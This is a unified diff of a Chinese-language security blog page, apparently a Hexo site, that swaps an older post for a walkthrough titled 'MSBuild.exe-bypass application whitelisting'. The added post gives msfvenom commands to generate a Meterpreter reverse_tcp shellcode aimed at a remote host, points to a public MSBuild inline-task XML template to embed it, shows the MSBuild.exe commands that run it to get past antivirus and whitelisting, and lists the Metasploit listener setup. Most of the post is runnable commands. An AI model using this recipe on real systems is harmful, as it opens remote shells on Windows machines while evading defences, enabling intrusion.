@@ -79,17 +79,23 @@
 
 
 
-<meta name="description" content="2018-03-06 首发于360安全客: https://www.anquanke.com/post/id/99793">
+<meta name="description" content="1）通过msfvenom生成C＃的shellcode1msfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.111 lport=4443 -f csharp  2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中1https://raw.githubusercontent.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="powershell反弹shell常见方式">
-<meta property="og:url" content="http://yoursite.com/2018/03/06/powershell反弹shell常见方式/index.html">
+<meta property="og:title" content="MSBuild.exe-bypass application whitelisting">
+<meta property="og:url" content="http://yoursite.com/2019/03/26/MSBuild.exe-bypass-application-whitelisting/index.html">
 <meta property="og:site_name" content="pplsec">
-<meta property="og:description" content="2018-03-06 首发于360安全客: https://www.anquanke.com/post/id/99793">
+<meta property="og:description" content="1）通过msfvenom生成C＃的shellcode1msfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.111 lport=4443 -f csharp  2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中1https://raw.githubusercontent.">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-03-06T01:38:36.000Z">
+<meta property="og:image" content="http://yoursite.com/images/MSBuild.exe-bypass-application-whitelisting-1.png">
+<meta property="og:image" content="http://yoursite.com/images/MSBuild.exe-bypass-application-whitelisting-2.jpg">
+<meta property="og:image" content="http://yoursite.com/images/MSBuild.exe-bypass-application-whitelisting-3.png">
+<meta property="og:image" content="http://yoursite.com/images/MSBuild.exe-bypass-application-whitelisting-4.png">
+<meta property="og:image" content="http://yoursite.com/images/MSBuild.exe-bypass-application-whitelisting-5.png">
+<meta property="og:updated_time" content="2019-03-26T14:38:36.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="powershell反弹shell常见方式">
-<meta name="twitter:description" content="2018-03-06 首发于360安全客: https://www.anquanke.com/post/id/99793">
+<meta name="twitter:title" content="MSBuild.exe-bypass application whitelisting">
+<meta name="twitter:description" content="1）通过msfvenom生成C＃的shellcode1msfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.111 lport=4443 -f csharp  2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中1https://raw.githubusercontent.">
+<meta name="twitter:image" content="http://yoursite.com/images/MSBuild.exe-bypass-application-whitelisting-1.png">
 
 
 
@@ -119,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/03/06/powershell反弹shell常见方式/">
+  <link rel="canonical" href="http://yoursite.com/2019/03/26/MSBuild.exe-bypass-application-whitelisting/">
 
 
 
 
 
-  <title>powershell反弹shell常见方式 | pplsec</title>
+  <title>MSBuild.exe-bypass application whitelisting | pplsec</title>
   
 
 
@@ -252,7 +258,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/06/powershell反弹shell常见方式/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/MSBuild.exe-bypass-application-whitelisting/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="pplsec">
@@ -269,7 +275,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">powershell反弹shell常见方式</h1>
+          <h1 class="post-title" itemprop="name headline">MSBuild.exe-bypass application whitelisting</h1>
         
 
         <div class="post-meta">
@@ -281,8 +287,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-06T09:38:36+08:00">
-                2018-03-06
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T22:38:36+08:00">
+                2019-03-26
               </time>
             
 
@@ -341,7 +347,16 @@
       
 
       
-        <p>2018-03-06 首发于360安全客: <a href="https://www.anquanke.com/post/id/99793" target="_blank" rel="noopener">https://www.anquanke.com/post/id/99793</a></p>
+        <h3 id="1）通过msfvenom生成C＃的shellcode"><a href="#1）通过msfvenom生成C＃的shellcode" class="headerlink" title="1）通过msfvenom生成C＃的shellcode"></a>1）通过msfvenom生成C＃的shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.111 lport=4443 -f csharp</span><br></pre></td></tr></table></figure>
+<p><img src="/images/MSBuild.exe-bypass-application-whitelisting-1.png" alt=""></p>
+<h3 id="2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中"><a href="#2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中" class="headerlink" title="2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中"></a>2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml</span><br></pre></td></tr></table></figure>
+<p>注意:从C＃shellcode中替换shellcode值，然后将msfvenom 生成的shellcode中的buf重命名为shellcode<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-2.jpg" alt=""></p>
+<h3 id="3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell"><a href="#3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell" class="headerlink" title="3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell"></a>3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell</h3><p>或者将上面xml文件后缀修改为.csproj (C#项目文件的扩展名) ，然后MSBuild.exe编译，同样可以执行shellcode 反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe D:\test\mstest.xml</span><br><span class="line">或者</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe  D:\test\mstest.csproj</span><br></pre></td></tr></table></figure>
+<p><img src="/images/MSBuild.exe-bypass-application-whitelisting-3.png" alt=""><br>或者<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-4.png" alt=""></p>
+<p>成功bypass av，反弹shell：<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-5.png" alt=""></p>
+<h3 id="补充：MSF开启监听"><a href="#补充：MSF开启监听" class="headerlink" title="补充：MSF开启监听"></a>补充：MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.0.19</span><br><span class="line">set LPORT 4443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+<p><strong>参考:</strong><br><a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/" target="_blank" rel="noopener">https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/</a> </p>
 
       
     </div>
@@ -366,15 +381,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/02/12/PHP弱类型/" rel="next" title="PHP弱类型">
+                <i class="fa fa-chevron-left"></i> PHP弱类型
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/07/28/利用Volatility进行入侵痕迹分析/" rel="prev" title="利用Volatility进行入侵痕迹分析">
-                利用Volatility进行入侵痕迹分析 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -426,8 +441,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -480,6 +504,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1）通过msfvenom生成C＃的shellcode"><span class="nav-text">1）通过msfvenom生成C＃的shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中"><span class="nav-text">2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell"><span class="nav-text">3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#补充：MSF开启监听"><span class="nav-text">补充：MSF开启监听</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
